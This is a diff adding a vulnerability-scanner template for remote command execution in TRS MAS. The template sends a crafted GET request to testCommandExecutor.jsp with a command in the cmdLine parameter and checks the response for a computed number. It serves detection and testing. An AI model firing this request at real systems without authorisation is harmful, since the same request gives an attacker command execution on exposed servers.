@@ -1,0 +1,26 @@
+id: trs-mas-testcommandexecutor-cmdline-rce
+info:
+  name: TRS MAS TestCommandExecutor Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects remote command execution in TRS MAS TestCommandExecutor by leveraging the testCommandExecutor.jsp endpoint with crafted cmdLine parameters.
+  reference:
+    - https://mp.weixin.qq.com/s/VECQ2fn7PptQHsVkNo8rQQ
+variables:
+  r1: '{{rand_int(1000000, 2000000)}}'
+  r2: '{{rand_int(2000000, 3000000)}}'
+http:
+  - raw:
+      - |
+        GET /mas/sysinfo/testCommandExecutor.jsp?cmdLine=type%20{{r1}}%20+%20{{r2}}&workDir=&pathEnv=&libPathEnv= HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{to_string(to_number(r1) + to_number(r2))}}'
+        part: body
